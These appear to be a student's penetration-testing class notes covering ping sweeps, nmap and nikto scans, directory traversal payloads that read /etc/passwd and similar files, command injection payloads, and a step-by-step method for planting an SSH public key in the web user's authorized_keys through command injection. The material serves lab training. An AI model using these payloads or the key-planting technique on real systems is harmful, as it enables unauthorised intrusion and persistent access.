### Host Discovery
- Narrow the scope 
  - ping sweep (see whats out there maybe cuz huge subnet)
    - `for i in {1..254} ;do (ping -c x.x.x.x | grep "bytes from" &) ;done`
  - now can enumerate the hosts, nmap
    - nmap the well-known ports, notice some important services
      - say it's http, you can use those scripts, some examples below:
      - `nmap -v -sT -Pn -T4 --script http-robots.txt.nse X.X.X.X`
      - `nmap -v -sT -Pn -T4 --script http-enum.nse X.X.X.X`
        - may need `=` connecting "--script" with "http-blahblah"
      - `nikto -h X.X.X.X`
- use web exploitation tools (view source, sql, inspect element, etc) ***HE SAID SOMETHING ABOUT CHANGING OPACITY, CODE COULD BE BLACK AND/OR WHITE IN PAGE SRC OR CONSOLE THAT WOULD'T NORMALLY BE VISIBLE***

### Web Exploitation
- Directory Traversal - information
  - ../../../../../../../../etc/passwd
  - ../../../../../../../../etc/group
  - ../../../../../../../../etc/hosts
  - ../../../../../../../../etc/networks
  - ../../../../../../../../etc/resolv.conf
- Cmd Injection - Information/Access
  - `; id`
  - `; whoami`
  - `; cat`
  - `; <CMD>`
- want to upload your SSH key to user that you are home directory
  - find the default home directoru, for the user, based off of /etc/passwd
    - `www-data:x:33:33:www-data:/var/www:/bin/bash` 
  - generate your own ssh keys 
    - `@linops: ssh-keygen -t rsa -b 4096` 
      - set no password
      - saves public key in /home/student/.ssh/id_rsa.pub
        - **dont use privat key dumbass**
      - `cat /home/student/.ssh/id_rsa.pub
      - copy the text and save it to put it on the vulnerable web stuff
  - utilizing command injection,
  - `; ls -la /var/www` to see what's there
    - if /.ssh directory is not there, create it
    - `; mkdir var/www//.ssh`
  - `; touch /var/www/.ssh/authorized_keys`
  - `; ls -la /var/www/.ssh` - **ALWAYS CHECK TO MAKE SURE THE THINGS YOU DID ACTUALLY HAPPENED**
  - `; echo "(id_rsa.pub conents)" >> /var/www/.ssh/authorized_keys`
- Good walkthrough for all this on **Web Exploitation Day 1** 
















